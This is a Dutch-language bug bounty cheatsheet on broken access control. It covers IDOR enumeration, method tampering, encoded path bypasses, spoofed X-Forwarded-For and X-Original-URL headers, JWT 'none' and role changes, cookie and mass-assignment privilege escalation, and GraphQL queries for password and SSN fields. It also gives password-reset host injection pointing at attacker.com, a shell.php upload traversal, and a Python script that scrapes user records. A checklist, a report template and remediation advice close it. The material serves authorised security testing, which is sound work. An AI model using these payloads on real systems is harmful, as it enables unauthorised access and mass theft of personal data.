
# Broken Access Control (BAC) - Bug Bounty Cheatsheet

## Basis Concepten

### Types Access Control

1. **Vertical Privilege Escalation** - User → Admin
2. **Horizontal Privilege Escalation** - User A → User B data
3. **Context-Dependent Access Control** - Bypass business logic

## IDOR (Insecure Direct Object Reference)

### Basis IDOR Testing

```
# Numeric IDs
/api/user/1234 → /api/user/1235
/profile?id=100 → /profile?id=101
/order/5000 → /order/5001

# UUID/GUID
/api/document/a8f5f167-f44a-4023-aa58-e2c8f93f32f0
→ Probeer andere UUIDs uit database leaks

# Encoded IDs
/user/MTIzNA== (base64: 1234)
/user/MTIzNQ== (base64: 1235)

# Hash-based
/file/5d41402abc4b2a76b9719d911017c592 (MD5 van ID)
```

### IDOR Detection Patterns

```
GET /api/users/123/orders
GET /api/users/456/orders (andere user)

POST /api/messages
{"to_user_id": 789, "message": "test"}
→ Verander to_user_id naar andere user

DELETE /api/posts/100
→ Probeer andere post IDs te deleten

PUT /api/settings/user/123
→ Probeer settings van user 456 te updaten
```

## HTTP Methods Testing

### Method Tampering

bash

````bash
# Als GET niet werkt, probeer andere methods
GET /api/admin/users → 403 Forbidden
POST /api/admin/users → 200 OK
PUT /api/admin/users → 200 OK
DELETE /api/admin/users → 200 OK
PATCH /api/admin/users → 200 OK
HEAD /api/admin/users → 200 OK
OPTIONS /api/admin/users → 200 OK
TRACE /api/admin/users → 200 OK
```

### BurpSuite: Change Request Method
```
1. Right-click op request
2. "Change request method"
3. Of manual in Repeater: GET → POST
```

## Path Manipulation

### Directory Traversal voor Access Control
```
# Basis paths
/admin → 403
/user/admin → 200
/api/v1/admin → 403
/api/v2/admin → 200

# Case manipulation
/Admin
/ADMIN
/AdMiN

# Path traversal
/user/../admin
/api/user/../../admin
/./admin
/admin/.

# Encoding
/admin → 403
/%61dmin → 200
/admin%2f → 200
/admin%252f → 200

# Double encoding
/%2561dmin
/%252561dmin
```

### URL Parameter Pollution
```
# Single parameter
/api/user?id=123 → Eigen data
/api/user?id=456 → Forbidden

# Parameter pollution
/api/user?id=123&id=456
/api/user?id=456&id=123
/api/user?id[]=123&id[]=456
````

## Header Manipulation

### Critical Headers to Test

http

```http
# IP Spoofing
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: localhost

# Custom headers
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Server: localhost
X-HTTP-Host-Override: localhost
```

### Referer-Based Access Control Bypass

http

```http
# Als toegang geweigerd wordt
Referer: https://target.com/admin

# Probeer van "admin" page te komen
Referer: https://target.com/dashboard
```

### Host Header Injection

http

```http
# Original request fails
Host: target.com
→ 403 Forbidden

# Try variations
Host: localhost
Host: 127.0.0.1
Host: target.com.localhost
Host: localhost.target.com
```

## Authentication & Session Testing

### JWT Token Manipulation

bash

```bash
# Decode JWT (base64)
echo "eyJhbGc..." | base64 -d

# Common JWT exploits
1. Algorithm confusion (RS256 → HS256)
2. None algorithm
3. Weak secret key
4. Kid manipulation
5. JKU/X5U injection
```

### JWT Payloads to Test

json

````json
# Change user role
{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "admin",  // Verander naar admin
  "iat": 1516239022
}

# Change user ID
{
  "sub": "999",  // Andere user ID
  "name": "John Doe",
  "iat": 1516239022
}

# None algorithm
{
  "alg": "none",
  "typ": "JWT"
}
```

### Session Cookie Testing
```
# Probeer andere user sessions
Cookie: session=abc123 → Cookie: session=xyz789

# Privilege escalation in cookie
Cookie: role=user → Cookie: role=admin
Cookie: is_admin=false → Cookie: is_admin=true
Cookie: user_type=0 → Cookie: user_type=1
````

## API-Specific Testing

### REST API Patterns

bash

```bash
# Resource enumeration
GET /api/v1/users/1
GET /api/v1/users/2
GET /api/v1/users/3
...

# Mass assignment
POST /api/users
{
  "username": "attacker",
  "email": "test@test.com",
  "role": "admin",  // Extra parameter
  "is_verified": true
}

# Hidden parameters
POST /api/users
{
  "username": "test",
  "is_admin": true,
  "privileges": ["admin"],
  "user_type": "admin"
}
```

### GraphQL Access Control

graphql

````graphql
# Query voor unauthorized data
{
  users {
    id
    email
    password  # Probeer gevoelige velden
    ssn
    salary
  }
}

# Introspection query
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# Mutation zonder auth
mutation {
  updateUser(id: 456, role: "admin") {
    id
    role
  }
}
```

## BurpSuite Workflows

### 1. Autorize Extension
```
1. Installeer "Autorize" extension
2. Configure low-privilege user cookie
3. Browse als high-privilege user
4. Autorize test automatisch elke request met low-priv cookie
5. Check voor unauthorized access
```

### 2. AutoRepeater
```
1. Installeer "AutoRepeater" extension
2. Configure replacement rules:
   - Replace user IDs
   - Replace session tokens
   - Replace parameters
3. Automatisch parallelle requests
```

### 3. Match & Replace Rules
```
Proxy → Options → Match and Replace

Add rules:
- Type: Request header
  Match: Cookie: session=USER1_SESSION
  Replace: Cookie: session=USER2_SESSION

- Type: Request parameter
  Match: user_id=123
  Replace: user_id=456
```

### 4. Intruder Attacks voor IDOR
```
Position markers:
GET /api/users/§1§/profile

Payload type: Numbers
- From: 1
- To: 10000
- Step: 1

Grep Extract:
- Extract "username"
- Extract "email"
- Compare responses
```

### 5. Session Handling Rules
```
Project Options → Sessions → Session Handling Rules

Add Rule: "Test Authorization"
1. Run macro with low-priv login
2. Update current request with token from macro
3. Scope: All tools
```

## Bypass Techniques

### Wildcard Bypass
```
# Als /admin/* geblokkeerd is
/admin
/admin.php
/admin/
/admin..
/admin;
/admin#

# Subdomain
admin.target.com
www.admin.target.com
```

### Parameter Manipulation
```
# Boolean bypass
is_admin=false → is_admin=true
admin=0 → admin=1
role=user → role=admin

# Array injection
user_id=123 → user_id[]=123&user_id[]=456
role=user → role[admin]=1

# JSON manipulation
{"user_id": 123} → {"user_id": 456}
{"role": "user"} → {"role": "admin"}
```

### Business Logic Bypass
```
# Price manipulation
amount=100 → amount=-100
quantity=1 → quantity=-1
price=50 → price=0.01

# Workflow bypass
step=1 → step=3 (skip verification)
status=pending → status=approved

# Rate limit bypass
X-Forwarded-For: random_ip
````

## Advanced Techniques

### Race Conditions

bash

````bash
# Parallelle requests met Turbo Intruder
POST /api/promo/redeem
{"code": "PROMO2024"}

# Send 10 requests simultaneously
# If not properly locked → multiple redemptions

# BurpSuite: Send to Turbo Intruder
# Use race-single-packet-attack.py template
```

### Registration Flows
```
1. Register als normal user
2. Intercept registration response
3. Add "role": "admin" to JSON
4. Forward modified response
5. Check if promoted to admin
```

### Password Reset Flows
```
# Token predictability
/reset?token=123456
/reset?token=123457

# Host header injection
POST /forgot-password
Host: attacker.com
email=victim@target.com

# Parameter pollution
/reset?token=VICTIM_TOKEN&email=attacker@evil.com
```

### File Upload Access Control
```
# Upload met restricted path
POST /api/upload
filename=../../admin/shell.php

# Access uploaded file
GET /uploads/../admin/shell.php

# Metadata manipulation
Content-Disposition: form-data; name="file"; filename="legit.jpg"
Content-Type: image/jpeg
→ Change to: filename="shell.php"
````

## Testing Checklist

### Horizontal Access Control

- [ ]  Test IDOR in alle endpoints
- [ ]  User A kan User B data niet zien
- [ ]  Profile updates alleen eigen profile
- [ ]  Orders alleen eigen orders
- [ ]  Messages alleen eigen messages
- [ ]  Test numeric IDs sequentially
- [ ]  Test UUIDs uit leaked data
- [ ]  Test encoded/hashed IDs

### Vertical Access Control

- [ ]  User kan geen admin functions gebruiken
- [ ]  Test /admin paths
- [ ]  Test API endpoints zonder auth
- [ ]  Test role escalation via parameters
- [ ]  Test JWT token manipulation
- [ ]  Test session cookie tampering
- [ ]  Test privileged operations

### Function-Level Access Control

- [ ]  DELETE methods restricted
- [ ]  PUT/PATCH restricted
- [ ]  Admin API endpoints restricted
- [ ]  Sensitive data export restricted
- [ ]  User creation restricted
- [ ]  Configuration changes restricted

### Multi-Step Processes

- [ ]  Cannot skip steps
- [ ]  Cannot go back to privileged steps
- [ ]  State properly maintained
- [ ]  Workflow validatie server-side

## Commands & Tools

### cURL Testing

bash

```bash
# Basis IDOR test
curl -H "Cookie: session=USER1" https://target.com/api/user/123
curl -H "Cookie: session=USER1" https://target.com/api/user/456

# Method tampering
curl -X POST https://target.com/admin
curl -X PUT https://target.com/admin
curl -X DELETE https://target.com/admin

# Header injection
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin

# JWT manipulation
curl -H "Authorization: Bearer MODIFIED_JWT" https://target.com/api/user
```

### Python Script voor IDOR Enumeration

python

```python
import requests

base_url = "https://target.com/api/users/"
headers = {"Cookie": "session=YOUR_SESSION"}

for user_id in range(1, 1000):
    response = requests.get(f"{base_url}{user_id}", headers=headers)
    if response.status_code == 200:
        print(f"[+] Found: {user_id} - {response.json()}")
    elif response.status_code != 404:
        print(f"[?] Interesting: {user_id} - {response.status_code}")
```

### FFuf voor Path Discovery

bash

````bash
# Admin path discovery
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302

# Parameter fuzzing
ffuf -u https://target.com/api/user?FUZZ=123 -w params.txt

# Header fuzzing
ffuf -u https://target.com/admin -H "FUZZ: 127.0.0.1" -w headers.txt
```

## Common Vulnerable Patterns
```
# Direct reference
/invoice/view?id=123

# Predictable tokens
/reset-password?token=123456

# Role in URL
/user/profile vs /admin/profile

# Client-side auth only
<button id="adminBtn" style="display:none">

# Hidden form fields
<input type="hidden" name="role" value="user">

# API without auth
/api/internal/users (geen authentication header)

# Mass assignment
POST /register {username, password, is_admin}
```

## Impact Demonstrations

### High Impact Scenarios
```
1. IDOR → PII Data Leakage
   Enumerate 1000 user profiles met SSN, adressen

2. Vertical Escalation → Admin Panel Access
   User account → Admin dashboard toegang

3. Horizontal Escalation → Financial Data
   Access andere users' bankrekeningen, transacties

4. Business Logic → Unauthorized Transactions
   Bypass payment → gratis premium features
````

## Reporting Template

markdown

````markdown
## Vulnerability: Broken Access Control (IDOR)

**Severity:** High

**Endpoint:** /api/users/{id}/documents

**Description:**
De applicatie controleert niet of authenticated user toegang heeft tot requested user_id.

**Steps to Reproduce:**
1. Login als User A (ID: 123)
2. Request: GET /api/users/123/documents → Success
3. Request: GET /api/users/456/documents → Success (User B data)

**Payload:**
```http
GET /api/users/456/documents HTTP/1.1
Host: target.com
Cookie: session=USER_A_SESSION
```

**Impact:**
Elke authenticated user kan documenten van alle andere users lezen, inclusief gevoelige persoonlijke informatie.

**Remediation:**
- Implementeer server-side authorization checks
- Validate user_id against authenticated session
- Use access control lists (ACL)
- Implement least privilege principle
````

## Tools

**BurpSuite Extensions:**

- Autorize
- AuthMatrix
- AutoRepeater
- InQL (GraphQL)

**Standalone Tools:**

- OWASP ZAP
- Postman
- Arjun (parameter discovery)
- JWT_Tool
- GraphQL Voyager